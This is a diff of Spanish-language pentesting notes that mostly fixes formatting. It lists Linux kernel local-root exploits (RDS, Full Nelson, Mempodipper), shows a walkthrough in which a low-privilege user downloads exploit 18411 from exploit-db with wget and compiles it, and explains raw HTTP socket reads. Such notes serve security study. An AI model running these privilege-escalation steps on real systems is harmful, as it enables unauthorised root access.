@@ -175,10 +175,10 @@ Kernel Linux <= 3.19.0-73.8
 ## CVE-2010-3904 (RDS)
 Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8
 
-##CVE-2010-4258 (Full Nelson)
-# nux Kernel 2.6.37 (RedHat / Ubuntu 10.04)
+## CVE-2010-4258 (Full Nelson)
+Linux Kernel 2.6.37 (RedHat / Ubuntu 10.04)
 # Otros
-##Mempodipper
+## Mempodipper
 
 Steve no tiene privilegios
 ```
@@ -189,7 +189,7 @@ ubuntu 11.10
 steve@ubuntu: uname -a
 linux ubu 3.0.0-12-generic <  kernel vulnerable
 ```
-Podemos buscar en exploit-db para ver el exploit, si hay. Encontramos   Mempodipper - Linux Local Root for >=2.6.39, 32-bit and 64 
+Podemos buscar en exploit-db para ver el exploit, si hay. Encontramos "Mempodipper - Linux Local Root for >=2.6.39, 32-bit and 64"
 ```
 steve@ubuntu: wget -O exploit.c http://www.exploit-db.com/download/18411
 steve@ubuntu: gcc exploit.c -o exploit
@@ -222,4 +222,4 @@ Connection: close
 Cada línea va seguida de un retorno de carro y una nueva línea, y todos los encabezados 2 están seguidos de una línea en blanco para señalar el final de la solicitud (todo esto es material estándar de HTTP).
 
 
-Tercera línea: A continuación, leemos la respuesta del socket usando "cat <&3", que lee la respuesta y la imprime.
+Tercera línea: A continuación, leemos la respuesta del socket usando "cat <&3", que lee la respuesta y la imprime por pantalla.
